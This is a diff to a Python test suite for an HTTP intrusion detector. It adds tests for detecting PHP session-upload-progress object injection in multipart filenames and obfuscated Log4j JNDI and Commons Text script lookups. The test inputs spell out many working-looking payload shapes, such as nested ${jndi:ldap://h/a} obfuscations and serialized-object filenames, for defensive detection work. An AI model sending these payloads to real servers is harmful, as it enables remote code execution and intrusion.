@@ -2227,7 +2227,8 @@ def test_struts_attack_dedup():
     check("attack dedup: every attack-class code is in the set",
           hw.ATTACK_CODES == {"HTTP-080", "HTTP-081", "HTTP-082", "HTTP-083",
                               "HTTP-084", "HTTP-085", "HTTP-086", "HTTP-087",
-                              "HTTP-088", "HTTP-090"})
+                              "HTTP-088", "HTTP-089", "HTTP-090", "HTTP-091",
+                              "HTTP-092"})
     check("attack dedup: and no posture code is",
           not (hw.ATTACK_CODES & {"HTTP-045", "HTTP-048", "HTTP-060"}))
 
@@ -2250,7 +2251,7 @@ def test_struts_attack_dedup():
           w3.stats["attacks_suppressed"] == 2)
 
 def test_registry():
-    check("registry: 39 codes", len(hw.FINDING_REGISTRY) == 39)
+    check("registry: 42 codes", len(hw.FINDING_REGISTRY) == 42)
     for code, d in hw.FINDING_REGISTRY.items():
         check(f"registry: {code} code matches key", d.code == code)
         check(f"registry: {code} has a summary", len(d.summary) > 20)
@@ -2805,15 +2806,70 @@ def test_php_cookie_registry_and_catalog():
               e["cvss_version"] == "4.0" and e["vector"].startswith("CVSS:4.0/"))
         check(f"catalog: {cve} KEV with its date",
               e["kev"] is True and e["kev_added"] == "2026-10-26")
-    check("catalog: phpAfterShell deferred with a substantive reason",
-          "CVE-2026-126714" in hw.DEFERRED_CVES and
-          "on-disk session state" in hw.DEFERRED_CVES["CVE-2026-126714"])
-    check("catalog: CVE-2026-115560 deferred as config-only",
+    # The 2026-11-22 OUT on phpAfterShell is REVERSED, and deliberately so.
+    # The old reason was that success leaves its mark in on-disk session
+    # state with no malformation on the wire. That is still true of the
+    # torn write - which is why HTTP-089 never claims one - but it was the
+    # wrong test: the DELIVERY is on the wire, because the object header
+    # has to survive PHP's own parameter decoding verbatim and satisfy
+    # PHP's own unserializer grammar, both of which were then measured
+    # against real PHP. So the CVE moves from deferred to detected, and
+    # these assertions pin the reversal rather than silently dropping the
+    # old one.
+    check("catalog: phpAfterShell is no longer deferred",
+          "CVE-2026-126714" not in hw.DEFERRED_CVES)
+    check("catalog: phpAfterShell is detected by HTTP-089",
+          "CVE-2026-126714" in hw.FINDING_REGISTRY["HTTP-089"].cves)
+    check("catalog: HTTP-089 never claims a torn write or a deserialization",
+          "not on the wire and is not inferred" in _ex_note_089())
+    check("catalog: CVE-2026-115560 is still deferred as config-only",
           "CVE-2026-115560" in hw.DEFERRED_CVES and
           "serialize_handler" in hw.DEFERRED_CVES["CVE-2026-115560"])
     detected = {c for x in hw.FINDING_REGISTRY.values() for c in x.cves}
-    check("catalog: deferred PHP CVEs are not also claimed as detected",
-          not ({"CVE-2026-126714", "CVE-2026-115560"} & detected))
+    check("catalog: the still-deferred PHP CVE is not claimed as detected",
+          "CVE-2026-115560" not in detected)
+
+
+PHP_OBJ = b'O:8:"stdClass":0:{}'
+PHP_OBJ_ESC = PHP_OBJ.replace(b'"', b'\\"')
+PHP_PROGRESS = b"PHP_SESSION_UPLOAD_PROGRESS"
+
+
+def _php_multipart(parts, boundary=b"----pb", cookie=b"PHPSESSID=abc"):
+    """Build a multipart request carrying `parts` as (headers, value)."""
+    body = b""
+    for h, v in parts:
+        body += b"--" + boundary + b"\r\n" + h + b"\r\n\r\n" + v + b"\r\n"
+    body += b"--" + boundary + b"--\r\n"
+    head = (b"POST /s.php HTTP/1.1\r\nHost: x\r\n")
+    if cookie:
+        head += b"Cookie: " + cookie + b"\r\n"
+    head += (b"Content-Type: multipart/form-data; boundary=" + boundary
+             + b"\r\nContent-Length: " + str(len(body)).encode() + b"\r\n\r\n")
+    return head + body
+
+
+def _php_prog(name=PHP_PROGRESS, value=b"tok"):
+    return (b'Content-Disposition: form-data; name="' + name + b'"', value)
+
+
+def _php_file(disp, value=b"d"):
+    return (b"Content-Disposition: form-data; " + disp
+            + b"\r\nContent-Type: text/plain", value)
+
+
+def _php_payload_disp(payload=None):
+    return b'name="f1"; filename="x|' + (payload or PHP_OBJ_ESC) + b'"'
+
+
+def _ex_note_089() -> str:
+    """The note HTTP-089 actually emits, read off a real finding rather
+    than off a constant."""
+    raw = _php_multipart([_php_prog(), _php_file(_php_payload_disp())])
+    for f in _ex(raw):
+        if f.code == "HTTP-089":
+            return f.evidence["note"]
+    return ""
 
 
 def test_php_cookie_live_regeneration():
@@ -3615,6 +3671,655 @@ def test_exchange_sharepoint_h2c():
           f1.evidence["body_visible"] is True
           and f1.evidence["dwp_present"] is True
           and f1.evidence["body_length"] > 0)
+
+
+
+# ---------------------------------------------------------------------------
+# HTTP-089: phpAfterShell. Every case here is a measurement against real
+# PHP 8.3.6 (php -S, upload progress on, cleanup off, session file read
+# back), not a reading of a spec.
+# ---------------------------------------------------------------------------
+def _php_codes(parts, **kw):
+    return {f.code for f in _ex(_php_multipart(parts, **kw))}
+
+
+def _php_find(parts, **kw):
+    for f in _ex(_php_multipart(parts, **kw)):
+        if f.code == "HTTP-089":
+            return f
+    return None
+
+
+def test_php_disposition_params():
+    """The PHP profile of Content-Disposition decoding, measured.
+
+    Two divergences from httpwatch's generic parse_content_type, and each
+    one is a route the generic decoder gets wrong: PHP takes the LAST
+    duplicate where the generic decoder takes the first, and PHP does not
+    see a parameter with OWS before its '=' where the generic decoder
+    accepts it.
+    """
+    P = hw.php_disposition_params
+    params, meta = P(b'form-data; name="f1"; filename="a.txt"')
+    check("php params: the simple case",
+          params[b"name"] == b"f1" and params[b"filename"] == b"a.txt")
+    # quoting: both " and ' quote, and backslash escapes inside
+    check("php params: backslash-escaped quotes unescape",
+          P(b'form-data; filename="x|O:8:\\"stdClass\\":0:{}"')[0][b"filename"]
+          == b'x|O:8:"stdClass":0:{}')
+    check("php params: a single-quoted value is a quoted value",
+          P(b"form-data; filename='x|O:8:\"stdClass\":0:{}'")[0][b"filename"]
+          == b'x|O:8:"stdClass":0:{}')
+    # unquoted values end at ';', space or tab - measured
+    check("php params: an unquoted value",
+          P(b"form-data; filename=a.txt")[0][b"filename"] == b"a.txt")
+    check("php params: an unquoted value ends at a semicolon",
+          P(b"form-data; filename=a.txt; name=f1")[0][b"filename"] == b"a.txt")
+    check("php params: an unquoted value ends at a space",
+          P(b"form-data; filename=x| O:8")[0][b"filename"] == b"x|")
+    # case folding on parameter names
+    check("php params: parameter names fold case",
+          P(b'form-data; FILENAME="a.txt"')[0][b"filename"] == b"a.txt")
+    # the LAST duplicate wins
+    check("php params: the last duplicate filename wins",
+          P(b'form-data; filename="first"; filename="second"')[0][b"filename"]
+          == b"second")
+    check("php params: the last duplicate name wins",
+          P(b'form-data; name="a"; name="b"')[0][b"name"] == b"b")
+    check("php params: duplicates are counted",
+          P(b'form-data; filename="a"; filename="b"')[1]["duplicates"] == 1)
+    # OWS before '=' - PHP does not see the parameter
+    for disp in (b'form-data; filename ="a.txt"',
+                 b'form-data; filename\t="a.txt"',
+                 b'form-data; filename = "a.txt"'):
+        params, meta = P(disp)
+        check(f"php params: OWS before '=' hides the parameter {disp!r}",
+              b"filename" not in params and meta["ows_before_eq"] >= 1)
+    # OWS after '=' is fine, and so is any amount after ';'
+    check("php params: OWS after '=' is accepted",
+          P(b'form-data; filename= "a.txt"')[0][b"filename"] == b"a.txt")
+    check("php params: no space after ';' is accepted",
+          P(b'form-data; name="f";filename="a.txt"')[0][b"filename"] == b"a.txt")
+    check("php params: extra space after ';' is accepted",
+          P(b'form-data; name="f";   filename="a.txt"')[0][b"filename"]
+          == b"a.txt")
+    # a quoted semicolon stays in the value
+    check("php params: a semicolon inside quotes is part of the value",
+          P(b'form-data; filename="a;b.txt"')[0][b"filename"] == b"a;b.txt")
+    # RFC 2231 is ignored entirely
+    params, meta = P(b"form-data; filename=\"d.txt\"; filename*=UTF-8''x%7Cy")
+    check("php params: filename* is ignored, not preferred",
+          params[b"filename"] == b"d.txt" and meta["rfc2231_ignored"] == 1)
+    check("php params: an empty value is empty, not absent",
+          P(b'form-data; filename=""')[0][b"filename"] == b"")
+
+
+def test_php_object_header():
+    """The matcher mirrors PHP's unserializer, including the exact length."""
+    H = hw.php_object_header
+    hit = H(b'x|O:8:"stdClass":0:{}')
+    check("php object: the canonical header matches",
+          hit and hit["class_name"] == "stdClass" and hit["kind"] == "O")
+    check("php object: the C: variant matches",
+          (H(b'x|C:11:"ArrayObject":21:{x:i:0;a:0:{};m:a:0:{}}') or {})
+          .get("class_name") == "ArrayObject")
+    check("php object: a namespaced class matches",
+          (H(b'x|O:7:"Foo\\Bar":0:{}') or {}).get("class_name") == "Foo\\Bar")
+    # the exact-length requirement is what rejects these
+    check("php object: a length longer than the name is rejected",
+          H(b'x|O:12:"draft":0:{}') is None)
+    check("php object: a truncated header is rejected",
+          H(b'x|O:12:"draft') is None)
+    check("php object: a length shorter than the name is rejected",
+          H(b'x|O:3:"stdClass":0:{}') is None)
+    # spellings PHP's unserializer was measured to reject
+    check("php object: lowercase o: is rejected",
+          H(b'x|o:8:"stdClass":0:{}') is None)
+    check("php object: a space after the colon is rejected",
+          H(b'x|O: 8:"stdClass":0:{}') is None)
+    check("php object: a class name containing '\"; is rejected",
+          H(b'x|O:12:"std";Class":0:{}') is None)
+    check("php object: a class name must not start with a digit",
+          H(b'x|O:3:"1ab":0:{}') is None)
+    # the '+' spelling: matched, but reported as not accepted by the
+    # measured branch, because the finding is DELIVERY not deserialization
+    plus = H(b'x|O:+8:"stdClass":0:{}')
+    check("php object: the plus-length spelling is matched",
+          plus is not None and plus["plus_length_form"] is True)
+    check("php object: the plus spelling is flagged as not accepted",
+          plus is not None and plus["spelling_accepted"] is False)
+    check("php object: a canonical spelling is flagged accepted",
+          hit is not None and hit["spelling_accepted"] is True)
+    # ordinary filenames
+    for benign in (b"a.txt", b"rapport final.pdf", b"a|b:c.txt",
+                   b"\xc3\xa9t\xc3\xa9 r\xc3\xa9sum\xc3\xa9.pdf",
+                   b'quote".txt', b"O:notanumber", b"O::", b"C:",
+                   b"C:\\Users\\me\\report.docx"):
+        check(f"php object: silent on the benign filename {benign!r}",
+              H(benign) is None)
+
+
+def test_http_089_positives():
+    """The shapes real PHP was measured to store."""
+    for label, disp in [
+        ("escaped quotes", _php_payload_disp()),
+        ("a single-quoted value",
+         b"name=\"f1\"; filename='x|" + PHP_OBJ + b"'"),
+        ("an unquoted value", b'name="f1"; filename=x|' + PHP_OBJ),
+        ("uppercase parameter names",
+         b'NAME="f1"; FILENAME="x|' + PHP_OBJ_ESC + b'"'),
+        ("a full path kept whole",
+         b'name="f1"; filename="dir/sub\\\\x|' + PHP_OBJ_ESC + b'"'),
+        ("a semicolon inside the quoted value",
+         b'name="f1"; filename="a;b|' + PHP_OBJ_ESC + b'"'),
+        ("OWS after the equals",
+         b'name="f1"; filename= "x|' + PHP_OBJ_ESC + b'"'),
+        ("the last duplicate carrying the payload",
+         b'name="f1"; filename="ok.txt"; filename="x|' + PHP_OBJ_ESC + b'"'),
+        ("no name parameter at all",
+         b'filename="x|' + PHP_OBJ_ESC + b'"'),
+        ("name after filename",
+         b'filename="x|' + PHP_OBJ_ESC + b'"; name="f1"'),
+        ("the C: variant",
+         b'name="f1"; filename="x|C:11:\\"ArrayObject\\":21:'
+         b'{x:i:0;a:0:{};m:a:0:{}}"'),
+        ("a namespaced class",
+         b'name="f1"; filename="x|O:7:\\"Foo\\\\Bar\\":0:{}"'),
+    ]:
+        check(f"HTTP-089 fires on {label}",
+              "HTTP-089" in _php_codes([_php_prog(), _php_file(disp)]))
+    # a FILE part's field name is stored too (measured), which settles the
+    # discrepancy with the public write-up in PHP's favour
+    check("HTTP-089 fires on a file part's field name",
+          "HTTP-089" in _php_codes([
+              _php_prog(),
+              _php_file(b'name="g|' + PHP_OBJ_ESC + b'"; filename="b.txt"')]))
+    # an obs-folded Content-Disposition, which PHP joins
+    check("HTTP-089 fires on an obs-folded disposition",
+          "HTTP-089" in _php_codes([
+              _php_prog(),
+              (b'Content-Disposition: form-data;\r\n name="f1";\r\n '
+               b'filename="x|' + PHP_OBJ_ESC + b'"', b"d")]))
+    # the payload in a later file part
+    check("HTTP-089 fires with the payload in a second file part",
+          "HTTP-089" in _php_codes([
+              _php_prog(),
+              _php_file(b'name="f0"; filename="ok.txt"'),
+              _php_file(_php_payload_disp())]))
+
+
+def test_http_089_negatives():
+    """The shapes PHP was measured NOT to store, or not to accept."""
+    for label, disp in [
+        ("an ordinary filename", b'name="f1"; filename="a.txt"'),
+        ("a unicode filename",
+         b'name="f1"; filename="\xc3\xa9t\xc3\xa9 r\xc3\xa9sum\xc3\xa9.pdf"'),
+        ("a Windows path", b'name="f1"; filename="C:\\\\Users\\\\me\\\\r.docx"'),
+        ("pipes and colons alone", b'name="f1"; filename="a|b:c.txt"'),
+        ("OWS before the equals",
+         b'name="f1"; filename ="x|' + PHP_OBJ_ESC + b'"'),
+        ("the payload only in filename*",
+         b'name="f1"; filename="dummy.txt"; filename*=UTF-8\'\'x%7CO%3A8'
+         b'%3A%22stdClass%22%3A0%3A%7B%7D'),
+        ("lowercase o:",
+         b'name="f1"; filename="x|o:8:\\"stdClass\\":0:{}"'),
+        ("a length mismatch",
+         b'name="f1"; filename="x|O:12:\\"draft\\":0:{}"'),
+        ("a truncated header", b'name="f1"; filename="x|O:12:\\"draft'),
+        ("a space after the colon",
+         b'name="f1"; filename="x|O: 8:\\"stdClass\\":0:{}"'),
+        ("a class name with a quote-semicolon",
+         b'name="f1"; filename="x|O:12:\\"std\\";Class\\":0:{}"'),
+        ("the benign duplicate winning",
+         b'name="f1"; filename="x|' + PHP_OBJ_ESC + b'"; filename="ok.txt"'),
+    ]:
+        check(f"HTTP-089 silent on {label}",
+              "HTTP-089" not in _php_codes([_php_prog(), _php_file(disp)]))
+    # the progress token cannot carry the record: a '|' in it makes the
+    # whole session write fail (measured)
+    check("HTTP-089 silent on a record in the progress token",
+          "HTTP-089" not in _php_codes([
+              _php_prog(value=b"t|" + PHP_OBJ),
+              _php_file(b'name="f1"; filename="c.txt"')]))
+    # part BODIES are never scanned: a legitimate serialized-file upload
+    # carries exactly these tokens, and PHP stores no file contents in the
+    # session
+    for label, content in [
+        ("a WXR export",
+         b'<wp:meta_value>a:1:{s:4:"evil";O:8:"stdClass":0:{}}</wp:meta_value>'),
+        ("a PHP-serialized file", b'O:8:"stdClass":0:{}'),
+        ("a serialized array", b'a:2:{i:0;s:3:"abc";i:1;O:8:"stdClass":0:{}}'),
+    ]:
+        check(f"HTTP-089 never scans part bodies: {label}",
+              "HTTP-089" not in _php_codes([
+                  _php_prog(),
+                  _php_file(b'name="f1"; filename="export.xml"', content)]))
+    # not multipart at all
+    body = b"f=x%7CO%3A8%3A%22stdClass%22%3A0%3A%7B%7D"
+    raw = (b"POST /s.php HTTP/1.1\r\nHost: x\r\n"
+           b"Content-Type: application/x-www-form-urlencoded\r\n"
+           b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
+    check("HTTP-089 is multipart-only",
+          "HTTP-089" not in {f.code for f in _ex(raw)})
+
+
+def test_http_089_storage_precondition():
+    """PHP's measured necessary condition for storing anything.
+
+    Measured symmetrically by reconfiguring the server: a non-file part,
+    with a non-empty value, whose name equals the configured
+    session.upload_progress.name must PRECEDE the file part. The configured
+    name is not on the wire, so the default-name match is reported and the
+    configuration-independent half is what gates `stored`.
+    """
+    f = _php_find([_php_prog(), _php_file(_php_payload_disp())])
+    check("HTTP-089 stored=True with the default progress field first",
+          f and f.evidence["stored"] is True
+          and f.evidence["default_progress_field_precedes"] is True)
+    # a custom-named field still arms storage on a server configured for it
+    f = _php_find([_php_prog(name=b"MY_CUSTOM_PROGRESS"),
+                   _php_file(_php_payload_disp())])
+    check("HTTP-089 a custom-named field still arms storage",
+          f and f.evidence["stored"] is True
+          and f.evidence["default_progress_field_precedes"] is False)
+    # nothing precedes it: PHP stores nothing on ANY configuration
+    f = _php_find([_php_file(_php_payload_disp())])
+    check("HTTP-089 fires with stored=False when nothing precedes",
+          f and f.evidence["stored"] is False and f.evidence["armed"] is False)
+    # a FILE part named as the progress field does not arm it (measured)
+    f = _php_find([_php_file(b'name="' + PHP_PROGRESS + b'"; filename="p.txt"',
+                             b"tok"),
+                   _php_file(_php_payload_disp())])
+    check("HTTP-089 a file part named as the progress field does not arm it",
+          f and f.evidence["armed"] is False)
+    # an empty value does not arm it (measured)
+    f = _php_find([_php_prog(value=b""), _php_file(_php_payload_disp())])
+    check("HTTP-089 an empty progress value does not arm it",
+          f and f.evidence["armed"] is False)
+    # the progress field AFTER the file part does not arm it (measured)
+    f = _php_find([_php_file(_php_payload_disp()), _php_prog()])
+    check("HTTP-089 a trailing progress field does not arm it",
+          f and f.evidence["armed"] is False)
+    # a non-file part's name is never stored (measured)
+    f = _php_find([_php_prog(),
+                   (b'Content-Disposition: form-data; name="h|'
+                    + PHP_OBJ_ESC + b'"', b"v")])
+    check("HTTP-089 a non-file part's name is stored=False",
+          f and f.evidence["stored"] is False
+          and f.evidence["file_part"] is False)
+
+
+def test_http_089_evidence():
+    raw = _php_multipart([_php_prog(), _php_file(_php_payload_disp(),
+                                                 b"SECRETBODY")],
+                         cookie=b"PHPSESSID=SESSIONMARKER")
+    f = [x for x in _ex(raw) if x.code == "HTTP-089"][0]
+    e = f.evidence
+    check("HTTP-089 names the parameter", e["param"] == "filename")
+    check("HTTP-089 reports the part index", e["part_index"] == 1)
+    check("HTTP-089 reports the class name", e["class_name"] == "stdClass")
+    check("HTTP-089 reports the record shape", e["record_shape"] is True)
+    check("HTTP-089 reports the declared length", e["declared_length"] == 8)
+    check("HTTP-089 digests the value",
+          e["value_digest"].startswith("sha256:"))
+    blob = repr(e)
+    check("HTTP-089 never logs the part body", "SECRETBODY" not in blob)
+    check("HTTP-089 never logs the session cookie value",
+          "SESSIONMARKER" not in blob)
+    check("HTTP-089 reports the session cookie as a boolean only",
+          e["session_cookie_present"] is True)
+    check("HTTP-089 does not log the value by default", "payload" not in e)
+    check("HTTP-089 says delivery, never a torn write",
+          "not on the wire and is not inferred" in e["note"])
+    cfg = hw.WatchConfig(log_attack_payload=True)
+    f2 = [x for x in _ex(raw, cfg) if x.code == "HTTP-089"][0]
+    check("HTTP-089 logs the parameter only when asked",
+          "stdClass" in f2.evidence.get("payload", ""))
+    check("HTTP-089 still withholds the body and cookie when asked",
+          "SECRETBODY" not in repr(f2.evidence)
+          and "SESSIONMARKER" not in repr(f2.evidence))
+
+
+def test_http_089_r2_counter_only():
+    """R2's scalar shape is a counter, never a finding."""
+    w = hw.HttpWatch()
+    for tok in (b"auth|b:1;", b"uid|i:0;", b"n|N;", b"a|a:0:{}",
+                b"s|s:3:abc"):
+        out = w.feed("x", "10.0.0.5", "10.0.0.9", 80,
+                     _php_multipart([_php_prog(),
+                                     _php_file(b'name="f1"; filename="'
+                                               + tok + b'"')]),
+                     True, now=1.0)
+        check(f"R2 never alerts on the scalar shape {tok!r}",
+              not any(f.code == "HTTP-089" for f in out))
+    check("R2 counts the scalar record shapes",
+          w.stats["php_scalar_record_shape"] >= 4)
+    check("php_scalar_record ignores a value with no pipe",
+          hw.php_scalar_record(b"s:3:abc") is None)
+    check("php_scalar_record ignores an unrecognised tail",
+          hw.php_scalar_record(b"name|notatoken") is None)
+
+
+# ---------------------------------------------------------------------------
+# HTTP-091 / HTTP-092: the lookup-grammar walker. The verdicts here are the
+# ones the real Log4j and Commons Text engines produce; the xcheck tier runs
+# them and requires exact agreement over a generated corpus.
+# ---------------------------------------------------------------------------
+JNDI = b"${jndi:ldap://h/a}"
+SCRIPT = b"${script:javascript:1}"
+
+
+def _lk(name, value, target=b"/"):
+    return (b"GET " + target + b" HTTP/1.1\r\nHost: v\r\n" + name + b": "
+            + value + b"\r\n\r\n")
+
+
+def test_lookup_walker_log4j_reaches():
+    """Every obfuscation measured to reach jndi on the real engine."""
+    T = b":ldap://h/a}"
+    for label, v in [
+        ("the plain form", b"${jndi" + T),
+        ("lower nested in the name", b"${${lower:j}ndi" + T),
+        ("upper nested in the name", b"${${upper:j}ndi" + T),
+        ("a default per character",
+         b"${${::-j}${::-n}${::-d}${::-i}" + T),
+        ("an unset env default", b"${${env:NOPE_X:-j}ndi" + T),
+        ("an unset sys default", b"${${sys:NOPE_X:-j}ndi" + T),
+        ("a quoted date literal", b"${${date:'j'}ndi" + T),
+        ("a quoted date literal, uppercase", b"${${date:'J'}ndi" + T),
+        ("an all-caps prefix", b"${JNDI" + T),
+        ("a mixed-case prefix", b"${jNdI" + T),
+        ("a lookup inside a default", b"${::-${jndi" + T + b"}"),
+        ("a nested lookup in the argument", b"${jndi:${lower:L}DAP://h/a}"),
+        ("double nesting", b"${${lower:${upper:j}}ndi" + T),
+        ("a default holding a nested lookup",
+         b"${${env:NOPE_X:-${lower:J}}ndi" + T),
+        ("literal text plus nesting", b"${j${::-n}di" + T),
+        ("the whole name lowered", b"${${lower:JNDI}" + T),
+        ("the dns scheme", b"${jndi:dns://h/a}"),
+        ("embedded mid-string", b"Mozilla/5.0 ${jndi" + T + b" trailing"),
+        ("a default after the uri", b"${jndi:ldap://h/a:-x}"),
+    ]:
+        w = hw.walk_lookups(v, hw.LOG4J_PROFILE)
+        check(f"walker log4j reaches jndi: {label}",
+              [h["lookup"] for h in w.hits] == ["jndi"])
+
+
+def test_lookup_walker_log4j_does_not():
+    """Every form measured NOT to reach jndi on the real engine."""
+    T = b":ldap://h/a}"
+    for label, v in [
+        ("an escaped dollar", b"$${jndi" + T),
+        ("a leading space", b"${ jndi" + T),
+        ("a space before the colon", b"${jndi " + T),
+        ("Turkish dotted I", "${jnd\u0130:ldap://h/a}".encode()),
+        ("a dotless i", "${jnd\u0131:ldap://h/a}".encode()),
+        ("fullwidth letters", "${\uff4a\uff4e\uff44\uff49:ldap://h/a}".encode()),
+        ("no re-scan of concatenated output", b"${::-$}{jndi" + T),
+        ("percent-encoding", b"%24%7Bjndi:ldap://h/a%7D"),
+        ("an unrendered template", b"${requestId}"),
+        ("a bash-style default", b"${jndi:-fallback}"),
+        ("a tab inside the prefix", b"${jn\tdi" + T),
+        ("a newline after the opener", b"${\njndi" + T),
+        ("the escaped self-referential shape",
+         b"${${::-${::-$${::-j}}}ndi" + T),
+    ]:
+        w = hw.walk_lookups(v, hw.LOG4J_PROFILE)
+        check(f"walker log4j stays silent: {label}", not w.hits)
+
+
+def test_lookup_walker_commons_text():
+    """Commons Text, where substitution in variable names is OFF."""
+    import base64 as _b64
+    b = _b64.b64encode(b"${script:js:1}")
+    b2 = _b64.b64encode(b"${urlDecoder:%24%7Bscript%3Ajs%3A1%7D}")
+    for label, v, want in [
+        ("the plain script lookup", b"${script:javascript:1}", ["script"]),
+        ("an all-caps prefix", b"${SCRIPT:js:1}", ["script"]),
+        ("a mixed-case prefix", b"${ScRiPt:js:1}", ["script"]),
+        ("a base64Decoder wrap", b"${base64Decoder:" + b + b"}", ["script"]),
+        ("a urlDecoder wrap",
+         b"${urlDecoder:%24%7Bscript%3Ajs%3A1%7D}", ["script"]),
+        ("two decoder layers", b"${base64Decoder:" + b2 + b"}", ["script"]),
+        ("the url lookup", b"${url:UTF-8:http://h/x}", ["url"]),
+        ("the dns lookup", b"${dns:address|h}", ["dns"]),
+        ("embedded mid-string", b"abc ${script:js:1} def", ["script"]),
+        # nested NAMES are off, so these do not reach a lookup
+        ("a nested name", b"${${::-s}cript:js:1}", []),
+        ("an escaped dollar", b"$${script:js:1}", []),
+        ("a leading space", b"${ script:js:1}", []),
+        ("an env default holding the lookup",
+         b"${env:NOPE_X:-${script:js:1}}", []),
+        ("double URL-encoding",
+         b"${urlDecoder:%2524%257Bscript%253Ajs%253A1%257D}", []),
+        ("a bash-style url default", b"${url:-http://h/x}", []),
+    ]:
+        w = hw.walk_lookups(v, hw.CTEXT_PROFILE)
+        check(f"walker commons-text: {label}",
+              [h["lookup"] for h in w.hits] == want)
+    # the ':-' scan stops at the first '${' when nested names are off, so
+    # the argument keeps the brace rather than splitting a default off it
+    w = hw.walk_lookups(b"${dns:${::-a}ddress|h}", hw.CTEXT_PROFILE)
+    check("walker commons-text: the ':-' scan stops at the first '${'",
+          w.hits and w.hits[0]["target"] == "${::-a")
+
+
+def test_lookup_walker_profiles_are_separate():
+    check("the log4j profile does not resolve script",
+          not hw.walk_lookups(SCRIPT, hw.LOG4J_PROFILE).hits)
+    check("the commons-text profile does not resolve jndi",
+          not hw.walk_lookups(JNDI, hw.CTEXT_PROFILE).hits)
+    check("neither profile walks a carrier with no '${'",
+          not hw.walk_lookups(b"Mozilla/5.0 jndi ldap://h/a",
+                              hw.LOG4J_PROFILE).hits)
+    check("the cheap gate costs no expansions",
+          hw.walk_lookups(b"Mozilla/5.0", hw.LOG4J_PROFILE).expansions == 0)
+
+
+def test_lookup_walker_opaque_cannot_complete():
+    """An OPAQUE value must never be able to COMPLETE a dangerous prefix.
+
+    Neither library has a substring function, so unknown text cannot be cut
+    down into "jndi" or "script" either.
+    """
+    for v in (b"${${env:PATH}ndi:ldap://h/a}",
+              b"${${sys:user.name}ndi:ldap://h/a}",
+              b"${${date:yyyy}ndi:ldap://h/a}",
+              b"${${java:version}ndi:ldap://h/a}",
+              b"${j${env:X}ndi:ldap://h/a}"):
+        check(f"an opaque value cannot complete a prefix: {v!r}",
+              not hw.walk_lookups(v, hw.LOG4J_PROFILE).hits)
+    # but an opaque ARGUMENT must not suppress the hit: the prefix is what
+    # makes it dangerous, not the target
+    w = hw.walk_lookups(b"${jndi:${env:EVIL_HOST}}", hw.LOG4J_PROFILE)
+    check("an opaque argument still reports the hit",
+          w.hits and w.hits[0]["target_opaque"] is True)
+    check("an unquoted date pattern is opaque",
+          not hw.walk_lookups(b"${${date:yyyyMMdd}ndi:ldap://h/a}",
+                              hw.LOG4J_PROFILE).hits)
+    check("an unterminated date quote is opaque",
+          not hw.walk_lookups(b"${${date:'j}ndi:ldap://h/a}",
+                              hw.LOG4J_PROFILE).hits)
+
+
+def test_lookup_walker_budget():
+    """A cap must emit a signal, never pass silently."""
+    deep = b"${" * 400 + b"jndi:ldap://h/a" + b"}" * 400
+    w = hw.walk_lookups(deep, hw.LOG4J_PROFILE)
+    check("the walker terminates on deeply nested input", True)
+    check("the walker signals the budget rather than passing silently",
+          w.budget_exceeded is True)
+    wide = b"".join(b"${env:X%d:-a}" % i for i in range(2000))
+    w2 = hw.walk_lookups(wide, hw.LOG4J_PROFILE)
+    check("the expansion cap signals too", w2.budget_exceeded is True)
+    # The counter records ATTEMPTED expansions, which keeps rising with the
+    # carrier length; what the cap bounds is the WORK, because every
+    # attempt past it resolves to OPAQUE instead of recursing. So the
+    # invariant is no amplification: never more attempts than the carrier
+    # could contain openers for.
+    check("the expansion counter never amplifies beyond the carrier",
+          w2.expansions <= wide.count(hw.LOOKUP_OPEN))
+    check("no work happens past the cap",
+          not hw.walk_lookups(wide, hw.LOG4J_PROFILE).hits)
+    # the budget reaches the operator as a counter
+    w3 = hw.HttpWatch()
+    w3.feed("x", "10.0.0.5", "10.0.0.9", 80, _lk(b"User-Agent", deep),
+            True, now=1.0)
+    check("the budget signal is counted",
+          w3.stats["walker_budget_exceeded"] >= 1)
+
+
+def test_lookup_carriers():
+    """Fixed-decoding carriers only, and bodies never."""
+    def labels(raw):
+        msgs = hw.parse_messages(raw) if hasattr(hw, "parse_messages") else None
+        return None
+    for label, raw in [
+        ("User-Agent", _lk(b"User-Agent", JNDI)),
+        ("X-Api-Version", _lk(b"X-Api-Version", JNDI)),
+        ("Referer", _lk(b"Referer", JNDI)),
+        ("X-Forwarded-For", _lk(b"X-Forwarded-For", JNDI)),
+        ("a cookie value", _lk(b"Cookie", b"sid=a; tok=" + JNDI)),
+        ("a percent-encoded cookie value",
+         _lk(b"Cookie", b"tok=%24%7Bjndi%3Aldap%3A%2F%2Fh%2Fa%7D")),
+        ("the raw target", _lk(b"X-N", b"x", b"/a" + JNDI)),
+        ("a query parameter value", _lk(b"X-N", b"x", b"/s?q=" + JNDI)),
+        ("a percent-encoded query value",
+         _lk(b"X-N", b"x", b"/s?q=%24%7Bjndi%3Aldap%3A%2F%2Fh%2Fa%7D")),
+        ("a query parameter name", _lk(b"X-N", b"x", b"/s?" + JNDI + b"=1")),
+    ]:
+        check(f"HTTP-091 fires in the carrier {label}",
+              "HTTP-091" in {f.code for f in _ex(raw)})
+    # bodies are out of scope, on every content type
+    for ct, body in [
+        (b"application/x-www-form-urlencoded", b"log=" + JNDI),
+        (b"application/json", b'{"ua":"' + JNDI + b'"}'),
+        (b"text/plain", b"a log line mentioning " + JNDI),
+    ]:
+        raw = (b"POST /x HTTP/1.1\r\nHost: v\r\nContent-Type: " + ct
+               + b"\r\nContent-Length: " + str(len(body)).encode()
+               + b"\r\n\r\n" + body)
+        check(f"HTTP-091 never scans a {ct.decode()} body",
+              "HTTP-091" not in {f.code for f in _ex(raw)})
+
+
+def test_lookup_basic_credentials():
+    """Scanned, never logged - not even behind the payload knob."""
+    import base64 as _b64
+    creds = _b64.b64encode(b"${jndi:ldap://h/a}:pw")
+    raw = _lk(b"Authorization", b"Basic " + creds)
+    f = [x for x in _ex(raw) if x.code == "HTTP-091"][0]
+    check("HTTP-091 scans Basic credentials",
+          f.evidence["carrier"] == "basic_credentials")
+    check("HTTP-091 never logs the credential bytes",
+          creds.decode() not in repr(f.evidence)
+          and "payload" not in f.evidence)
+    cfg = hw.WatchConfig(log_attack_payload=True)
+    f2 = [x for x in _ex(raw, cfg) if x.code == "HTTP-091"][0]
+    check("HTTP-091 withholds credentials even with the payload knob on",
+          "payload" not in f2.evidence)
+    # an ordinary Basic header is not a carrier at all
+    ok = _b64.b64encode(b"alice:secret")
+    check("HTTP-091 silent on ordinary Basic credentials",
+          "HTTP-091" not in {f.code
+                             for f in _ex(_lk(b"Authorization", b"Basic " + ok))})
+
+
+def test_lookup_evidence():
